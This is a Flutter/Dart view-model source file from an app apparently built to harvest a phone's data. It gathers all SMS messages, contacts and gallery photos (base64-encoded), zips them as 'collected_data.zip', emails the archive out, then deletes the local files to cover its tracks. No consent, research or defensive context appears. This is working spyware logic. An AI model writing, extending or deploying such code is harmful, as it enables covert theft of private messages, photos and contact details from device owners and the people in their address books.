import 'dart:io';
import 'package:base_app/services/EmailService.dart';
import 'package:flutter/cupertino.dart';
import 'package:mailer/mailer.dart';
import 'package:mailer/smtp_server.dart';
import 'package:path_provider/path_provider.dart';
import '../constants/AppStrings.dart';
import '../constants/ConstMethods.dart';
import '../services/SmsService.dart';
import '../services/contactsService.dart';
import '../services/galleryService.dart';
import '../services/zipService.dart';
import '../services/permissionsService.dart';
import 'package:url_launcher/url_launcher.dart';

class HomePageViewModel extends ChangeNotifier {
  final SmsService smsService = SmsService();
  final ContactsServices contactsService = ContactsServices();
  final GalleryService galleryService = GalleryService();
  final ZipService zipService = ZipService();
  final PermissionsService permissionsService = PermissionsService();
  final EmailService emailService = EmailService();

  bool isLoading = false;
  List<File> files = [];

  Future<void> getDataAndSendEmail(
      BuildContext context, String recipientEmail) async {
    try {
      bool permissionsGranted =
          await permissionsService.requestAllPermissions();
      if (!permissionsGranted) {
        ConstMethods.showBottomSheet(context,
            const Text(AppStrings.theNecessaryPermissionsWereNotGiven));
        return;
      } else {
        isLoading = true;
        await _getSms();
        await _getContacts();
        await _getGallery();
        final zipFile = await _createZip();
        await emailService.sendEmail(zipFile);
        await _deleteSpecificFiles();
        isLoading = false;
      }
    } catch (e) {
      isLoading = false;
      notifyListeners();
    }
  }


  Future<void> _getSms() async {
    try {
      final smsMessages = await smsService.getSmsMessages();
      String path = await _getFilePath('sms.txt');
      final smsFile = File(path);
      await smsFile.writeAsString(
        smsMessages
            .map((e) => 'From: ${e.address}, Message: ${e.body}')
            .join('\n'),
      );
      files.add(smsFile);
      print("sms dosyası oluştu");
    } catch (e) {
      print("Hata: $e");
    }
  }

  Future<void> _getContacts() async {
    try {
      final contacts = await contactsService.getContactsFromDevice();
      String path = await _getFilePath('contacts.txt');
      final contactsFile = File(path);
      await contactsFile.writeAsString(
        contacts
            .map((e) =>
                'Name: ${e.displayName}, Phone: ${e.phones?.map((p) => p.value).join(", ")}')
            .join('\n'),
      );
      files.add(contactsFile);
      print("rehber dosyası oluştu");
    } catch (e) {}
  }

  Future<void> _getGallery() async {
    try {
      final photos = await galleryService.getPhotos();
      List<String> base64Photos = [];
      for (var photo in photos) {
        String base64Photo = await galleryService.convertPhotoToBase64(photo);
        base64Photos.add(base64Photo);
      }
      String path = await _getFilePath('gallery_base64.txt');
      final galleryFile = File(path);
      await galleryFile.writeAsString(base64Photos.join('\n'));
      files.add(galleryFile);
      print("galeri dosyası oluştu");
    } catch (e) {
      print("hata: ${e.toString()}");
    }
  }

  Future<File> _createZip() async {
    try {
      String zipPath = await _getFilePath('collected_data.zip');
      final zipFile = await zipService.createZip(files, zipPath);
      print("zip dosyası oluştu");
      return zipFile;
    } catch (e) {
      rethrow;
    }
  }

  Future<void> _deleteSpecificFiles() async {
    try {
      List<String> fileNames = [
        'sms.txt',
        'contacts.txt',
        'gallery_base64.txt',
        'collected_data.zip',
      ];
      for (var fileName in fileNames) {
        String path = await _getFilePath(fileName);
        final file = File(path);
        if (await file.exists()) {
          await file.delete();
        }
      }
      print("zip dosyası silindi");
    } catch (e) {
      print("hata $e");
    }
  }
}

Future<String> _getFilePath(String fileName) async {
  final directory = await getApplicationDocumentsDirectory();
  return '${directory.path}/$fileName';
}